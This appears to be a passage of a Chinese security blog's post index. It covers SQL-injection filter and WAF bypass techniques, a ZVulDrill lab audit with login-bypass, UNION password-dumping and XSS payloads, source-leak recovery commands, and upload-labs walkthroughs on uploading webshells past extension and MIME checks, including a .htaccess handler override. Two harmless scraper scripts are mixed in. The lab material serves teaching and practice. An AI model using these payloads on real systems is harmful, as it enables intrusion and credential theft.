‘1’=’1的方式闭合后面的引号，这样就可以绕过空格加注释过滤的sql注入。 在本地测试的时候不能直接把%09等特殊字符放到sql语句中，必须经过url解码。 其他可以代替空格的方法：浮点数代替空格科学计数法代替空格括号绕过()在进行空格的时候需要注意：不是所有的语句都支持括号代替空格的。所以进行括号绕过时，需要在本地测试看语句是否支持括号。加号减号绕过(+,-)进行绕过时最后将+和-进行url编码。和括号绕过一样，对于有些语句是不支持的。 12` `号绕过select * from`users`; 同上面一样对于一些语句也是不支持。 ~,!,@,+,-,””,’’,{}等特殊字符绕过空格。这些绕过过滤的空格的字符，在一些语句都是不支持的，需要在本地经过测试才行。 sql函数和关键字12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455MySQL：union distinctunion distinctrowprocedure analyse()updatexml()extracavalue()exp()ceil()atan()sqrt()floor()ceiling()tan()rand()sign()greatest()字符串截取函数Mid(version(),1,1)Substr(version(),1,1)Substring(version(),1,1)Lpad(version(),1,1)Rpad(version(),1,1)Left(version(),1)reverse(right(reverse(version()),1)字符串连接函数concat(version(),'|',user());concat_ws('|',1,2,3)字符转换Char(49)Hex('a')Unhex(61)过滤了逗号(1)limit处的逗号：limit 1 offset 0(2)字符串截取处的逗号mid处的逗号：mid(version() from 1 for 1)MSSQL：IS_SRVROLEMEMBER()IS_MEMBER()HAS_DBACCESS()convert()col_name()object_id()is_srvrolemember()is_member()字符串截取函数Substring(@@version,1,1)Left(@@version,1)Right(@@version,1)(2)字符串转换函数Ascii('a') 这里的函数可以在括号之间添加空格的，一些waf过滤不严会导致bypassChar('97')exec 0x02 绕过过滤大小写绕过数据库对大小写不敏感，如果后台代码只过滤的小写的关键字，我们可以通过大小写混合来绕过。 内联注释这个mysql才有的特性:1/*!关键字*/上面的代码会没数据库解析执行为sql语句。 编码绕过1.URL编码在Chrome中输入一个连接，非保留字的字符浏览器会对其URL编码，如空格变为%20、单引号%27、左括号%28、右括号%29普通的URL编码可能无法实现绕过，还存在一种情况URL编码只进行了一次过滤，可以用两次编码绕过：page.php?id=1%252f%252a*/UNION%252f%252a /SELECT2.十六进制编码常用的是对参数进行十六进制编码，对一些关键字最好不用编码。3.Unicode编码Unicode有所谓的标准编码和非标准编码，假设我们用的utf-8为标准编码，那么西欧语系所使用的就是非标准编码了看一下常用的几个符号的一些Unicode编码：1234567单引号: %u0027、%u02b9、%u02bc%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8右括号：%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9 空格绕过%20 %09 %0a %0b %0c %0d %a0 /**/ 这些都可以替换空格。 当这些字符都被过滤时，我们可以使用括号将子查询包含起来:任何可以计算出结果的语句，都可以用括号包围起来。 等价函数绕过12345678910111213141516171819hex()、bin()，ord() ==&gt; ascii()sleep() ==&gt;benchmark()concat_ws()==&gt;group_concat()mid()、substr() ==&gt; substring()@@user ==&gt; user()@@datadir ==&gt; datadir()举例：substring()和substr()无法使用时：?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74 或者：substr((select 'password'),1,1) = 0x70strcmp(left('password',1), 0x69) = 1strcmp(left('password',1), 0x70) = 0strcmp(left('password',1), 0x71) = -1 特殊函数绕过1234567891011121314151617181920212223242526272829303132333435363738394041421. 通过greatest函数绕过不能使用大小于符号的情况greatest(a,b)，返回a和b中较大的那个数。当我们要猜解user()第一个字符的ascii码是否小于等于150时，可使用：mysql&gt; select greatest(ascii(mid(user(),1,1)),150)=150; +------------------------------------------+| greatest(ascii(mid(user(),1,1)),150)=150 | +------------------------------------------+| 1 | +------------------------------------------+如果小于150，则上述返回值为True。2. 通过substr函数绕过不能使用逗号的情况mid(user() from 1 for 1)或substr(user() from 1 for 1)mysql&gt; select ascii(substr(user() from 1 for 1)) &lt; 150; +------------------------------------------+| ascii(substr(user() from 1 for 1)) &lt; 150 | +------------------------------------------+| 1 | +------------------------------------------+3.使用数学运算函数在子查询中报错exp(x)函数的作用： 取常数e的x次方，其中，e是自然对数的底。~x 是一个一元运算符，将x按位取补select exp(~(select*from(select user())a))mysql报错：mysql&gt; select exp(~(select*from(select user())a));ERROR 1690 (22003): DOUBLE value is out of range in ‘exp(~((select ‘root@localhost’ from dual)))’这条查询会出错，是因为exp(x)的参数x过大，超过了数值范围，分解到子查询，就是：(select*from(select user())a) 得到字符串 root@localhost表达式’root@localhost’被转换为0，按位取补之后得到一个非常的大数，它是MySQL中最大的无符号整数 PHP一些常见的过滤方法及绕过方式1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859过滤关键字 and orphp代码 preg_match('/(and|or)/i',$id)会过滤的攻击代码 1 or 1=1 1 and 1=1绕过方式 1 || 1=1 1 &amp;&amp; 1=1过滤关键字 and or unionphp代码 preg_match('/(and|or|union)/i',$id)会过滤的攻击代码 union select user,password from users绕过方式 1 &amp;&amp; (select user from users where userid=1)='admin'过滤关键字 and or union wherephp代码 preg_match('/(and|or|union|where)/i',$id)会过滤的攻击代码 1 &amp;&amp; (select user from users where user_id = 1) = 'admin'绕过方式 1 &amp;&amp; (select user from users limit 1) = 'admin'过滤关键字 and or union wherephp代码 preg_match('/(and|or|union|where)/i',$id)会过滤的攻击代码 1 &amp;&amp; (select user from users where user_id = 1) = 'admin'绕过方式 1 &amp;&amp; (select user from users limit 1) = 'admin'过滤关键字 and, or, union, where, limitphp代码 preg_match('/(and|or|union|where|limit)/i', $id)会过滤的攻击代码 1 &amp;&amp; (select user from users limit 1) = 'admin'绕过方式 1 &amp;&amp; (select user from users group by user_id having user_id = 1) = 'admin'#user_id聚合中user_id为1的user为admin过滤关键字 and, or, union, where, limit, group byphp代码 preg_match('/(and|or|union|where|limit|group by)/i', $id)会过滤的攻击代码 1 &amp;&amp; (select user from users group by user_id having user_id = 1) = 'admin'绕过方式 1 &amp;&amp; (select substr(group_concat(user_id),1,1) user from users ) = 1过滤关键字 and, or, union, where, limit, group by, selectphp代码 preg_match('/(and|or|union|where|limit|group by|select)/i', $id)会过滤的攻击代码 1 &amp;&amp; (select substr(gruop_concat(user_id),1,1) user from users) = 1绕过方式 1 &amp;&amp; substr(user,1,1) = 'a'过滤关键字 and, or, union, where, limit, group by, select, 'php代码 preg_match('/(and|or|union|where|limit|group by|select|\\')/i', $id)会过滤的攻击代码 1 &amp;&amp; (select substr(gruop_concat(user_id),1,1) user from users) = 1绕过方式 1 &amp;&amp; user_id is not null 1 &amp;&amp; substr(user,1,1) = 0x61 1 &amp;&amp; substr(user,1,1) = unhex(61)过滤关键字 and, or, union, where, limit, group by, select, ', hexphp代码 preg_match('/(and|or|union|where|limit|group by|select|\\'|hex)/i', $id)会过滤的攻击代码 1 &amp;&amp; substr(user,1,1) = unhex(61)绕过方式 1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16)) #十进制的11转化为十六进制，并小写。过滤关键字 and, or, union, where, limit, group by, select, ', hex, substrphp代码 preg_match('/(and|or|union|where|limit|group by|select|\\'|hex|substr)/i', $id)会过滤的攻击代码 1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16))/td&gt;绕过方式 1 &amp;&amp; lpad(user,7,1)过滤关键字 and, or, union, where, limit, group by, select, ', hex, substr, 空格php代码 preg_match('/(and|or|union|where|limit|group by|select|\\'|hex|substr|\\s)/i', $id)会过滤的攻击代码 1 &amp;&amp; lpad(user,7,1)/td&gt;绕过方式 1%0b||%0blpad(user,7,1)过滤关键字 and or union wherephp代码 preg_match('/(and|or|union|where)/i',$id)会过滤的攻击代码 1 || (select user from users where user_id = 1) = 'admin'绕过方式 1 || (select user from users limit 1) = 'admin'","link":"/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80.html"},{"title":"代码审计初试-对zvuldrill漏洞靶场的代码审计(一)","text":"一.zvuldrill靶场搭建靶场地址:https://github.com/710leo/ZVulDrill按照上面的要求需要创建一个名为zvuldrill的数据库，在将sys文件夹下的zvuldrill.sql导入到新建数据库中。创建完成之后，在浏览器打开:http://127.0.0.1/ZVulDrill/ 即可访问 二.后台登录功能万能密码绕过采用正向审计的方法，即先找到用户的可控输入位置，在定位到危险函数。首先用rips代码审计工具进行scan，找到用户可控输入找到用户可控输入$_POST[pass]，发现它存在于logCheck.php中，用seay代码审计工具打开所以我们可以直接构造万能密码123' or 1 or '1' or 1 #' or 1 --直接不用输入密码就可以绕过检测机制我们来验证一下用Navicat数据库工具打开本地的数据库将logCheck.php中的改造一下1SELECT * FROM admin WHERE admin_name = 'admin' or '1'AND admin_pass = SHA('$pass')复制到数据库命令行中登录网站:http://127.0.0.1/ZVulDrill/admin/login.php根据seay自带的mysql检测工具可以看到，我们进行的数据库操作 三.前台搜索功能sql注入继续看rips扫描的结果，发现有个$_GET[search]参数用户可控用seay审计工具打开发现用户传入的search参数，没有进行任何过滤就直接加入了sql语句中，这容易造成搜索型sql注入。验证，打开数据库命令行，先查看数据库有几列用order by语句，发现为5时会报错，4时显示正常，所以这个数据库的列是4。所以我们打开admin的数据表，查看对应的列名。可以用union select联合查询语句构造payload，直接爆出管理员的密码。1SELECT * FROM comment WHERE comment_text LIKE '%%' union select admin_id,admin_name,admin_pass,4 from admin;用过构造sql注入语句11%' union select 1,2,admin_pass,4 from admin#在网页中尝试 发现可以爆出管理员的密码 在这个搜索页面中不光有sql注入漏洞，xss也同样存在，因为这个页面对用户输入的没有进行过滤。构造xss payload:1&lt;script&gt;alert(/xss/)&lt;/script&gt;完成弹框","link":"/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%88%9D%E8%AF%95-%E5%AF%B9zvuldrill%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%B8%80.html"},{"title":"博客图片无法正常显示说明","text":"这两天重新装了一下hexo博客，在处理上传图片时发现，用之前的markdown格式上传本地图片网页不在显示，通过百度知道可以使用如下语法：1{% asset_img test.jpg This is an test image %}所以我们将之前的上传的图片都改成这种格式，写个python脚本批量改即可。脚本如下：12345678910111213141516171819202122import osdef change_blog_image(text): with open(text, 'r+', encoding='utf-8') as fp: r = fp.readlines() with open(\"new\", \"w+\", encoding='utf-8') as fp1: for i in r: if (i.startswith(\"![\")): a = i.split(\".png\") #只能更改博客10张图片 num = a[0][-1:] # print(num) b = \"{% asset_img \" + \"{0}.png\".format(num) + \" This is an test image %}\" rep = i i = i.replace(rep, b) fp1.write(i + \"\\n\") else: fp1.write(i)if __name__ == '__main__': text=input() change_blog_image(text) os.remove(text) os.rename('new',text)说明一下：这个脚本只能改图片只有10张的博客(保存在本地的图片格式为：数字(1,2,3,4….).png)。","link":"/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87%E6%97%A0%E6%B3%95%E6%AD%A3%E5%B8%B8%E6%98%BE%E7%A4%BA%E8%AF%B4%E6%98%8E.html"},{"title":"多线程爬取表情包","text":"通过threading库加上queue的安全队列进行了一次对表情包网的爬出。代码如下：使用了消费者和生产者的多线程爬虫。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061import osimport reimport threadingfrom queue import Queuefrom urllib import requestimport requestsfrom lxml import etreeclass Producer(threading.Thread): headers = { &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36&quot; } def __init__ (self, page_queue, img_queue, *args, **kwargs): super(Producer, self).__init__(*args, **kwargs) self.page_queue = page_queue self.image_queue = img_queue def run(self): while True: if self.page_queue.empty(): break url = self.page_queue.get() self.spider(url) def spider(self, url): resp = requests.get(url, headers=self.headers) text = resp.text html = etree.HTML(text) imgs = html.xpath(&quot;//div[@class='page-content text-center']//img[@class!='gif']&quot;) for i in imgs: img = i.get('data-original') suffix = os.path.splitext(img)[1] alt = i.get('alt') alt = re.sub(r'[\\?\\.？。，,!！\\*]', '', alt) filename = alt + suffix print('/images/%s' %filename) self.image_queue.put((img, filename))class Consumer(threading.Thread): def __init__(self,page_queue,img_queue,*args,**kwargs): super(Consumer, self).__init__(*args, **kwargs) self.page_queue = page_queue self.img_queue = img_queue def run(self): while True: if self.page_queue.empty() and self.img_queue.empty(): break img_url,filename=self.img_queue.get() request.urlretrieve(img_url,&quot;images/&quot;+filename) print(filename+&quot; 下载完成！&quot;)def main(): page_queue = Queue(100) img_queue = Queue(1000) base_url = &quot;http://www.doutula.com/photo/list/?page={}&quot; for i in range(1, 101): url = base_url.format(i) page_queue.put(url) for i in range(5): t=Producer(page_queue,img_queue) t.start() for i in range(5): t=Consumer(page_queue,img_queue) t.start()if __name__ == '__main__': main()","link":"/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%88%AC%E5%8F%96%E8%A1%A8%E6%83%85%E5%8C%85.html"},{"title":"实战_爬取中国天气网","text":"目标将中国天气网所有城市的最低气温爬取下来，将最低气温的前十名可视化显示出来。这个爬虫比较简单没有做反爬处理，所以对于获取html代码比较简单，关键在于如何解析得到的html代码。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import requestsfrom bs4 import BeautifulSoupfrom pyecharts.charts.bar import BarALL_DATA=[]def parse_page(url): headers={ &quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&quot; } resp=requests.get(url,headers=headers) #print(resp.text) text=resp.content.decode(&quot;utf-8&quot;) # print(text) #这里使用的解析器是html5lib，因为在使用常用的lxml解析器容错率不好，港澳台天气这个页面html书写不规范，从而无法正常爬取。 #pip install html5lib soup=BeautifulSoup(text,&quot;html5lib&quot;) divs=soup.find(&quot;div&quot;,class_=&quot;conMidtab&quot;) #获取第一个div标签 tables=divs.find_all(&quot;table&quot;) for table in tables: trs=table.find_all(&quot;tr&quot;)[2:] for index,tr in enumerate(trs): # print(tr) # print(&quot;=&quot;*30) tds=tr.find_all(&quot;td&quot;) if(index==0): city_td=tds[1] else: city_td=tds[0] city=list(city_td.stripped_strings)[0] # print(city) temp_td=tds[-2] temp=list(temp_td.stripped_strings)[0] # print({'city':city,'temp':temp}) data={'city':city,'temp':int(temp)} ALL_DATA.append(data)def spider(): base_url=&quot;http://www.weather.com.cn/textFC/{}.shtml&quot; params=[&quot;hb&quot;,&quot;db&quot;,&quot;hd&quot;,&quot;hz&quot;,&quot;hn&quot;,&quot;xb&quot;,&quot;xn&quot;,&quot;gat&quot;] for param in params: url=base_url.format(param) parse_page(url) ALL_DATA.sort(key=lambda x:x['temp']) # print(ALL_DATA) data=ALL_DATA[0:10] cicties=list(map(lambda x:x['city'],data)) temps=list(map(lambda x:x['temp'],data)) chart=Bar(&quot;中国天气排行榜&quot;) chart.add(&quot;&quot;,cicties,temps) chart.render('temp.html')if __name__ == '__main__': spider() 要点这里使用的是beautifulsoup库，用的解析器是html5lib；因为在爬取港澳台地区的天气时，这个页面的html代码写的不规范。如果我们使用常用的lxml解析器的话会无法正常爬取。1pip install html5lib这里是这段代码比较重要的部分，通过sort函数对得到的数据进行排序，’key=’参数指定按什么关键字排序。1ALL_DATA.sort(key=lambda x:x['temp'])这里是按照字典中的temp参数进行排序 12cicties=list(map(lambda x:x['city'],data))temps=list(map(lambda x:x['temp'],data)) 这段代码是通过lambda和map()将城市和对应的最低温度形成单个的列表 最后效果如图：","link":"/%E5%AE%9E%E6%88%98-%E7%88%AC%E5%8F%96%E4%B8%AD%E5%9B%BD%E5%A4%A9%E6%B0%94%E7%BD%91.html"},{"title":"文件泄露漏洞解析","text":"一. 漏洞形成源码泄露漏洞的形成原因很简单就是因为一些备份文件或者可以恢复源码的文件放在了外网中，用户可以访问，只要用户找到了这些文件的位置，就可以运用工具进行源码恢复。 二.源码泄露漏洞分类1. .git/.hg文件泄露.git/.hg在执行init初始化目录的时候会创建一个.git/.hg目录，包含了所有的git/hg存储何种操作对象。在管理员发布代码的时候，没有把.git/.hg目录删除，而是直接发布到了服务器目录中，那么我们就可以用这个文件进行恢复源码操作。发现方法：通过目录扫描工具进行扫描，如果发现.git/.hg目录说明有该漏洞。下图是用dirsearch扫描.git漏洞：dirsearch用法：1python3 dirsearch.py -u url -e *扫描到了.git目录，使用githack工具进行源码恢复：1python2 githack.py https://www.example.com/.git/也可以使用dvcs-ripper工具：1rip-git.pl -v -u http://www.example.com/.git/这样就可以将源码恢复了。 例题：BUUCTF [BJDCTF2020]Mark loves cat对于.hg也是一样，都是先通过目录扫描工具，然后使用对应的工具进行源码恢复工作。使用dvcs-ripper工具，用法为：1rip-hg.pl -v -u http://www.example.com/.hg/ 2.DS_Store文件泄漏形成原因：管理员没有把.ds_store文件删除。扫描到漏洞利用目录：1http://www.example.com/.ds_store使用dsstoreexp工具进行恢复：1python ds_store_exp.py http://www.example.com/.DS_Store先用dirsearch扫描目录发现.DS_Store文件：再使用ds_store_exp工具恢复源码：例题：Bugku web sql注入2 3.文件备份泄露这个漏洞是网站进行升级或者因为某种原因，管理员没有删除备份文件且备份文件没有设置权限，可以被下载下来。例如：’.rar’,’.zip’,’.tar’,’.tar.bz2’,’.sql’,’.7z’,’.bak’,’.txt’,’.swp’,’index.php.bak’等可以使用dirsearch扫描或者SourceLeakHacker都可以。扫描完下载下来就可以了。例题：bugku 备份是个好习惯；buuctf [ACTF2020 新生赛]BackupFile 4.SVN导致文件泄露在SVN管理的过程中，会自动生成一个.svn的文件夹，包含了源代码信息，而如果管理员直接复制代码文件到Web服务器上，使得.svn文件同样暴露在外网环境下而没有清理。同样使用扫描工具可以扫到，使用dvcs-ripper工具恢复1rip-svn.pl -v -u http://www.example.com/.svn/例题：SVN信息泄露漏洞分析(第1题)——墨者学院在线靶场 5.CVS泄漏漏洞利用点：12http://url/CVS/Root 返回根信息http://url/CVS/Entries 返回所有文件的结构取回源码命令：1bk clone http://url/name dir这个命令的意思就是把远端一个名为name的repo clone到本地名为dir的目录下。 1查看所有的改变的命令，转到download的目录：bk changes 6.Bazaar/bzr工具：dvcs-ripper1rip-bzr.pl -v -u http://www.example.com/.bzr/ 7.WEB-INF/web.xml泄露WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。漏洞成因：通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^/WEB-INF/* { deny all; } 或者return 404; 或者其他1234WEB-INF/web.xml : Web应用程序配置文件, 描述了servlet和其他的应用组件配置及命名规则. WEB-INF/database.properties : 数据库配置文件 WEB-INF/classes/ : 一般用来存放Java类文件(.class) WEB-INF/lib/ : 用来存放打包好的库(.jar) WEB-INF/src/ : 用来放源代码(.asp和.php等)例题：DDCTF 2018 Web Writeup 参考博客：12","link":"/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90.html"},{"title":"文件上传靶场通关笔记","text":"upload-labs 文件上传靶场通关笔记第一关。上传前端检测 有两种方法：1.直接f12，查看js检测函数，在把form表单中检测函数删掉就能绕过前端检测2.先将后缀名改成合法的后缀，上传抓包，在包中再把后缀改过来就能绕过。 最后会把一句话木马上传到服务器，完成上传 这类的前端检测文件上传，不安全，是纸老虎！！ 文件上传必须在后端做检测。前端验证的标志就是弹框提示12345678910111213141516171819&lt;script type=&quot;text/javascript&quot;&gt; function checkFile() { var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == &quot;&quot;) { alert(&quot;请选择要上传的文件!&quot;); return false; } //定义允许上传的文件类型 var allow_ext = &quot;.jpg|.png|.gif&quot;; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;)); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name) == -1) { var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name; alert(errMsg); return false; } }&lt;/script&gt;前端代码如上面第二关。查看源码：1234567891011121314151617if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '文件类型不正确，请重新上传！'; } } else { $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！'; }}发现这段代码只对文件的content-type作出了判断，所以我们可以通过抓包改文件的type来突破上传这样就可以上传绕过对于文件mine类型的检测 第三关123456789101112131415161718192021222324if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array('.asp','.aspx','.php','.jsp'); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if(!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; }}这段代码是文件上传的黑名单检测，只要是黑名单里面的后缀名都禁止上传黑名单在设计时可能有遗漏，我们可以找到这些遗漏的后缀名，突破上传。像 php5,php4,cer等都是遗漏的点但是这里有个做法，就是重命名上传文件，关键代码是：12$temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;用菜刀连接的时候是访问.php5这样是可以访问的 不是php第四关源码：12345678910111213141516171819202122232425if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件不允许上传!'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; }}这也是黑名单检测，但是它把所以可以利用的后缀名全部过滤了。这里要用到一个新的知识点：.htaccess.htaccess是apache服务器中的一个配置文件。它负责相关目录下的网页配置，通过.htaccess文件可以实现网页301重定向、自定义404页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能123&lt;FilesMatch &quot;D&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;这是.htaccess文件，调用php的解析器一个文件名，只要包含”cimer”这个字符串的任意文件，都当作php解析 所以利用思路就是先上传.htaccess文件，在上传.htaccess中指定的文件 完成突破 第五关源码:123456789101112131415161718192021222324if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件类型不允许上传！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; }}根据源码发现它没有对大小写进行限制，所以我们可以进行大小写绕过 第六关源码：12345678910111213141516171819202122232425if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = $_FILES['upload_file']['name']; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件不允许上传'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; }}看见源码没有对末尾进行去空格操作，所以可以在上传时抓包 